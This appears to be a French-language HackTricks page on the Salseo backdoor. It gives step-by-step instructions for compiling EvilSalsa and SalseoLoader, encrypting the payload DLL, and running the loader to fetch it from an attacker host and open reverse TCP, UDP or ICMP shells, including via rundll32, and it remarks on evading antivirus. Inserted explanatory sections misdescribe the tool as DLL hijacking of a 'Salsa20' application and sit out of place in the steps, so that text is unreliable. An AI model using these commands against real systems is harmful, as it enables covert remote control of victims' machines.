# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilation des binaires

Téléchargez le code source depuis Github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.

Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (si Windows prend en charge x64, compilez-les pour cette architecture).

Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche dans **"Platform Target".**

(\*\*Si vous ne trouvez pas ces options, cliquez sur **"Project Tab"** puis sur **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Ensuite, compilez les deux projets (Build -> Build Solution) (Le chemin de l'exécutable apparaîtra dans les journaux) :

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Préparation de la porte dérobée

Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### Introduction

Les backdoors sont des outils très utiles pour les pentesters et les attaquants. Ils permettent d'accéder à un système compromis à distance et de manière discrète. Dans ce chapitre, nous allons nous concentrer sur les backdoors pour les systèmes Windows.

### Salseo

Salseo est un backdoor pour les systèmes Windows qui utilise une technique appelée « DLL hijacking ». Cette technique consiste à remplacer une DLL légitime par une DLL malveillante qui sera chargée par une application tierce. Salseo utilise cette technique pour se charger dans l'application « Salsa20 », qui est un algorithme de chiffrement utilisé par de nombreuses applications.

Une fois que Salseo est chargé dans l'application, il peut être utilisé pour exécuter des commandes à distance, télécharger et exécuter des fichiers, et même prendre le contrôle complet du système compromis.

### Utilisation de Salseo

Pour utiliser Salseo, vous devez d'abord le compiler à l'aide de Visual Studio. Une fois que vous avez compilé le backdoor, vous devez le placer dans le même répertoire que l'application « Salsa20 ». Ensuite, vous devez renommer le backdoor en utilisant le nom de la DLL légitime que vous souhaitez remplacer.

Par exemple, si vous souhaitez remplacer la DLL « salsa20.dll », vous devez renommer le backdoor en « salsa20.dll ». Ensuite, lorsque l'application « Salsa20 » sera lancée, elle chargera la DLL malveillante à la place de la DLL légitime.

### Conclusion

Salseo est un backdoor puissant pour les systèmes Windows qui utilise une technique de DLL hijacking pour se charger dans une application tierce. Il peut être utilisé pour exécuter des commandes à distance, télécharger et exécuter des fichiers, et même prendre le contrôle complet du système compromis. Les pentesters et les attaquants doivent être conscients de cette technique et prendre des mesures pour la prévenir.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, vous avez maintenant tout ce dont vous avez besoin pour exécuter tout le processus Salseo : le **fichier EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**

**Téléchargez le binaire SalseoLoader.exe sur la machine. Il ne devrait pas être détecté par un quelconque antivirus...**

## **Exécuter la porte dérobée**

### **Obtenir un shell TCP inversé (téléchargement du fichier dll encodé via HTTP)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un serveur HTTP pour servir le fichier evilsalsa encodé.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtention d'un shell inversé UDP (téléchargement d'un fichier dll encodé via SMB)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un serveur SMB pour servir le fichier evilsalsa encodé (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtenir un shell inverse ICMP (dll encodée déjà présente sur la victime)**

**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inverse. Téléchargez:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Désactiver les réponses ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Exécuter le client :
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### À l'intérieur de la victime, exécutons la chose salseo :
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilation de SalseoLoader en tant que DLL exportant une fonction principale

Ouvrez le projet SalseoLoader à l'aide de Visual Studio.

### Ajoutez avant la fonction principale: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)

### Installez DllExport pour ce projet

#### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la fenêtre contextuelle)**

![](<../.gitbook/assets/image (4) (1) (1) (1).png>)

Dans votre dossier de projet, les fichiers suivants sont apparus: **DllExport.bat** et **DllExport\_Configure.bat**

### **Désinstallez** DllExport

Appuyez sur **Désinstaller** (oui, c'est bizarre mais croyez-moi, c'est nécessaire)

![](<../.gitbook/assets/image (5) (1) (1) (2).png>)

### **Quittez Visual Studio et exécutez DllExport\_configure**

Simplement **quittez** Visual Studio

Ensuite, allez dans votre dossier **SalseoLoader** et **exécutez DllExport\_Configure.bat**

Sélectionnez **x64** (si vous allez l'utiliser dans une boîte x64, c'était mon cas), sélectionnez **System.Runtime.InteropServices** (dans **Namespace pour DllExport**) et appuyez sur **Appliquer**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Ouvrez à nouveau le projet avec Visual Studio**

**\[DllExport]** ne doit plus être marqué comme une erreur

![](<../.gitbook/assets/image (8) (1).png>)

### Compilez la solution

Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)

![](<../.gitbook/assets/image (10) (1).png>)

Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Générer --> Plateforme cible = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Pour **compiler** la solution: Build --> Build Solution (Le chemin de la nouvelle DLL apparaîtra dans la console de sortie)

### Testez la DLL générée

Copiez et collez la DLL où vous voulez la tester.

Exécutez:
```
rundll32.exe SalseoLoader.dll,main
```
Si aucune erreur n'apparaît, vous avez probablement une DLL fonctionnelle !!

## Obtenir un shell en utilisant la DLL

N'oubliez pas d'utiliser un **serveur HTTP** et de définir un **écouteur nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) est un outil intégré dans Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles. Les backdoors peuvent être créées en utilisant des commandes CMD pour exécuter des scripts malveillants ou pour ouvrir des ports pour une connexion à distance. Les backdoors CMD peuvent être cachées en utilisant des noms de fichiers aléatoires ou en les plaçant dans des dossiers système. Les backdoors CMD peuvent être détectées en surveillant les connexions réseau sortantes et en recherchant des processus suspects en cours d'exécution.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
